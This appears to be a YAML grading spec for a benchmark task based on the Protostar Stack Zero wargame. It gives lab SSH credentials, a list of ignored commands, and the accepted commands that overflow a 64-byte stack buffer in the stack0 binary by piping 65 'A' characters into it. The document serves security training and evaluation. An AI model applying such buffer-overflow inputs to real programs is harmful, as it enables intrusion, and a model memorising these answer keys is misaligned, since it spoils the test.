version: '0.5'
graph:
  type: reference
challenge:
  id: protostar_stack0
  name: Protostar Stack Zero
  description: Overflow the 64-byte stack buffer so that the adjacent modified variable becomes non-zero.
attacker_context:
  user: user
  access:
    method: ssh
    credentials:
      username: user
      password: user
  target:
    host: <target-hostname-or-ip>
    port: 22
goal:
  node: node1
irrelevant_commands:
- pwd
- id
- whoami
- clear
- history
- uname
- hostname
- man
- strings
- checksec
- file
- ls
- ls -la
- env
- printenv
nodes:
- id: start
  type: sentinel
  label: Start
- id: node0
  type: state
  label: Overflow length identified
- id: node1
  type: state
  label: modified variable overwritten
edges:
- id: edge0
  from: start
  to: node0
  action: identify_minimum_overflow_length
  accepted_commands:
  - python -c 'print "A"*65' | /opt/protostar/bin/stack0
  - perl -e 'print "A"x65' | /opt/protostar/bin/stack0
  transition_match:
    exit_code: 0
    stdout_regex: .*changed the 'modified' variable.*
    stderr_regex: ^$
- id: edge1
  from: node0
  to: node1
  action: replay_working_overflow
  accepted_commands:
  - python -c 'print "A"*65' | /opt/protostar/bin/stack0
  transition_match:
    exit_code: 0
    stdout_regex: .*changed the 'modified' variable.*
    stderr_regex: ^$
